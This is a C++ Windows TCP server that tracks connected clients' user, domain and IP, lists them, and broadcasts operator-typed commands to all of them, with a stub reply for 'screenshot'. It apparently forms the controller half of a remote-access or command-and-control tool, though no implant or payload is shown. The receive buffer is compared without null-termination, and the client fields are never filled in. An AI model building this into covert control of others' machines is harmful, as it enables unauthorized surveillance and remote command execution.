#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <map>
#include <string>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <windows.h>
#include <shellapi.h>

#pragma comment(lib, "ws2_32.lib")

struct ClientInfo {
    std::string domain;
    std::string computer;
    std::string ip;
    std::string user;
    time_t lastActivity;
};

std::map<SOCKET, ClientInfo> clients;
std::mutex clientsMutex;

void handleClient(SOCKET clientSocket) {
    char buffer[1024];
    while (true) {
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            break;
        }

        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients[clientSocket].lastActivity = time(0);
        }


        if (strcmp(buffer, "screenshot") == 0) {
            std::string command = "1";
            send(clientSocket, command.c_str(), command.size(), 0);
        }
        else if (strcmp(buffer, "exit") == 0) {
            break;
        }
    }
    closesocket(clientSocket);
}

void displayClients() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        std::lock_guard<std::mutex> lock(clientsMutex);
        system("cls");
        for (const auto& client : clients) {
            std::cout << "Client IP: " << client.second.ip << ", User: " << client.second.user
                << ", Last Activity: " << ctime(&client.second.lastActivity);
        }
    }
}

void sendCommandToClients(const std::string& command) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    for (const auto& client : clients) {
        send(client.first, command.c_str(), command.size(), 0);
    }
}

void commandInputLoop() {
    while (true) {
        std::string command;
        std::cout << "\nEnter command to send to clients: ";
        std::getline(std::cin, command);
        sendCommandToClients(command);
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(54000);
    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, SOMAXCONN);

    std::thread(displayClients).detach();
    std::thread(commandInputLoop).detach();

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
        ClientInfo info;
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients[clientSocket] = info;
        }

        std::thread(handleClient, clientSocket).detach();
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}